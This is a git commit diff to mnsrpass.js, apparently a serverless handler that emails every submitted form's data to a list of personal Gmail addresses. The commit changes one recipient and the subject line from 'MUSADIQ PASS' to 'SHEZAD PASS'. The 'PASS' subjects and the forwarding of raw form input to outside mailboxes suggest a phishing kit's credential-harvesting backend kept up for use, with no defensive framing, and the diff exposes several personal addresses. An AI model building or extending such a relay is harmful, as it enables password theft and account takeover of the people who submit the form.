db9907481c4890762ac1dbed21f97bde052d421d
nxnxcmmc-sys <nxnxcmmc@gmail.com>
2026-04-27 13:04:22 +0500

    Update mnsrpass.js

--- mnsrpass.js
+++ mnsrpass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,drivingjames01@gmail.com",
-      subject: "MUSADIQ PASS",
+      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,shahzadalinizamani357@gmail.com",
+      subject: "SHEZAD PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
